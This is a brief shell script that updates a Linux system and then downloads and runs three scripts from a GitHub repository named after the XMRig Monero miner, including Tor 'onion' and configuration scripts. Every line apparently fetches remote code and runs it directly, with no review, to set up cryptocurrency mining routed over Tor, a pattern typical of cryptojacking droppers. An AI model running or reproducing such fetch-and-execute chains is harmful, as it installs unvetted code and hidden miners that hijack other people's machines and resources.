#!/bin/sh

sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt update -y && sudo apt upgrade -y

wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/onion.sh && chmod +x onion.sh && ./onion.sh
wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/xmr.sh && chmod +x xmr.sh && ./xmr.sh
wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/config.sh && chmod +x config.sh && ./config.sh
